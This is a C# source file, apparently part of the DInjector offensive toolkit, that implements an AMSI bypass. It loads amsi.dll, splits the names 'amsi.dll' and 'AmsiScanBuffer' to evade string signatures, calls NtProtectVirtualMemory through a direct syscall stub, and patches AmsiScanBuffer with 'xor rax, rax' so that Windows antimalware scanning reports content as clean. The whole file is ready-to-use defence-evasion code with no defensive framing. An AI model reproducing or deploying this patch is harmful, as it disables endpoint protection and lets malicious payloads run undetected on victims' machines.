using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class AM51
    {
        // xor rax, rax
        private static readonly byte[] x64 = new byte[] {0x48, 0x31, 0xC0};

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr LoadLibraryA(
            string name);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        public static void Patch()
        {
            ChangeBytes(x64);
        }

        private static void ChangeBytes(byte[] patch)
        {
            try
            {
                #region GetProcAddress (LoadLibraryA)

                // Parsing _PEB_LDR_DATA structure of kernel32.dll
                IntPtr pkernel32 = DI.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");

                // Library to load
                var am = "am";
                var si = "si";
                var dll = ".dll";
                object[] LoadLibParams = {am + si + dll};

                // Get LoadLibraryA address
                IntPtr pointer = DI.DynamicInvoke.Generic.GetExportAddress(pkernel32, "LoadLibraryA");

                // Call LoadLibraryA for the library mentioned above
                var lib = (IntPtr)DI.DynamicInvoke.Generic.DynamicFunctionInvoke(pointer, typeof(LoadLibraryA), ref LoadLibParams);

                // Function to patch
                var Am = "Am";
                var siScan = "siScan";
                var Buffer = "Buffer";
                object[] GetProcAddressParams = {lib, Am + siScan + Buffer};

                // Get GetProcAddress address
                pointer = DI.DynamicInvoke.Generic.GetExportAddress(pkernel32, "GetProcAddress");

                // Call GetProcAddress for the function mentioned above
                var addr = (IntPtr)DI.DynamicInvoke.Generic.DynamicFunctionInvoke(pointer, typeof(GetProcAddress), ref GetProcAddressParams);

                #endregion

                #region NtProtectVirtualMemory (PAGE_READWRITE)

                IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
                NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

                // Save value of addr as this is increased by NtProtectVirtualMemory
                IntPtr oldAddress = addr;

                DI.Data.Native.NTSTATUS ntstatus;
                IntPtr hProcess = Process.GetCurrentProcess().Handle;
                var regionSize = (IntPtr)patch.Length;
                uint oldProtect = 0;

                ntstatus = sysNtProtectVirtualMemory(
                    hProcess,
                    ref addr,
                    ref regionSize,
                    DI.Data.Win32.WinNT.PAGE_READWRITE,
                    out oldProtect);

                if (ntstatus == 0)
                {
                    Console.WriteLine("(AM51) [+] NtProtectVirtualMemory");
                }
                else
                {
                    Console.WriteLine($"(AM51) [-] NtProtectVirtualMemory: {ntstatus}");
                }

                Console.WriteLine("(AM51) [>] Patching at address: " + string.Format("{0:X}", oldAddress.ToInt64()));
                Marshal.Copy(patch, 0, oldAddress, patch.Length);

                #endregion

                #region NtProtectVirtualMemory (oldProtect)

                // CleanUp permissions back to oldProtect
                regionSize = (IntPtr)patch.Length;

                ntstatus = sysNtProtectVirtualMemory(
                    hProcess,
                    ref oldAddress,
                    ref regionSize,
                    oldProtect,
                    out uint _);

                if (ntstatus == 0)
                {
                    Console.WriteLine("(AM51) [+] NtProtectVirtualMemory");
                }
                else
                {
                    Console.WriteLine($"(AM51) [-] NtProtectVirtualMemory: {ntstatus}");
                }

                #endregion
            }
            catch (Exception e)
            {
                Console.WriteLine($"(AM51) [x] {e.Message}");
                Console.WriteLine($"(AM51) [x] {e.InnerException}");
            }
        }
    }
}
